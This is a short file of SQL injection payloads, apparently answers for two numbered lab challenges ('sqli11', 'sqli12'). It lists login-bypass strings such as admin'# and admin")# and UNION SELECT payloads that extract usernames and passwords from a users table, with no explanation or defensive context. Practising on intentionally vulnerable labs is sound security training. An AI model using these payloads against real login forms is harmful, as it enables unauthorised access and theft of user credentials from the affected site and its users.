# sqli11

    # admin' || '1
    # admin'#
    # 1' union select username, password from users where username='admin'or'1'='1#

# sqli12

    # admin")#
    # admin") || ("1
    # 1") union select username, password from users where username='admin'or("1")=("1#